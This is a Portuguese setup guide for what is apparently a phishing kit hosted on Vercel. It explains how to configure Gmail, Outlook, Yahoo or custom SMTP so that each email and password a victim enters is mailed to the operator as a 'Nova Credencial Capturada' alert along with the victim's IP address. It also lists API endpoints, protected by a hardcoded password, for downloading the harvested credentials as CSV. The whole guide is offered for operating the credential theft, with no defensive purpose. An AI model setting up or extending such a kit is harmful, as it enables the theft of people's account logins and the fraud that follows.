# 📧 Como Configurar Envio de Email Automático

Quando alguém preencher email e senha, você receberá automaticamente um email com as credenciais!

## ⚙️ Configuração na Vercel

### Opção 1: Gmail (Recomendado)

1. Vá em **Settings** → **Environment Variables** na Vercel
2. Adicione as seguintes variáveis:

```
EMAIL_TO=seu-email@gmail.com
SMTP_HOST=smtp.gmail.com
SMTP_PORT=587
SMTP_SECURE=false
SMTP_USER=seu-email@gmail.com
SMTP_PASS=sua-senha-de-app
```

**⚠️ Importante para Gmail:**
- Você precisa criar uma "Senha de App" no Google
- Acesse: https://myaccount.google.com/apppasswords
- Gere uma senha de app e use ela no `SMTP_PASS`

### Opção 2: Outros Provedores

#### Outlook/Hotmail
```
EMAIL_TO=seu-email@outlook.com
SMTP_HOST=smtp-mail.outlook.com
SMTP_PORT=587
SMTP_SECURE=false
SMTP_USER=seu-email@outlook.com
SMTP_PASS=sua-senha
```

#### Yahoo
```
EMAIL_TO=seu-email@yahoo.com
SMTP_HOST=smtp.mail.yahoo.com
SMTP_PORT=587
SMTP_SECURE=false
SMTP_USER=seu-email@yahoo.com
SMTP_PASS=sua-senha-de-app
```

#### Servidor SMTP Personalizado
```
EMAIL_TO=seu-email@dominio.com
SMTP_HOST=smtp.dominio.com
SMTP_PORT=587
SMTP_SECURE=false
SMTP_USER=seu-usuario
SMTP_PASS=sua-senha
```

## 🔧 Configurar via CLI

```bash
vercel env add EMAIL_TO
vercel env add SMTP_HOST
vercel env add SMTP_PORT
vercel env add SMTP_SECURE
vercel env add SMTP_USER
vercel env add SMTP_PASS
```

## 📨 O que você receberá

Quando alguém preencher email e senha, você receberá um email com:

- **Assunto:** 🔐 Nova Credencial Capturada - [email]
- **Conteúdo:**
  - Email capturado
  - Senha capturada
  - Data/Hora
  - IP Address

## ✅ Testar

Após configurar, faça um teste preenchendo o formulário. Você deve receber o email em alguns segundos.

## 🔒 Segurança

- As credenciais de email ficam seguras nas variáveis de ambiente
- Use senhas de app quando possível (Gmail, Yahoo)
- Não compartilhe suas credenciais SMTP

## 🚫 Se não quiser usar email

Se não configurar as variáveis de email, o sistema continuará funcionando normalmente, apenas não enviará emails. Você ainda pode acessar as credenciais via:

- `/api/download-csv?password=senha123`
- `/api/get-credentials?password=senha123`
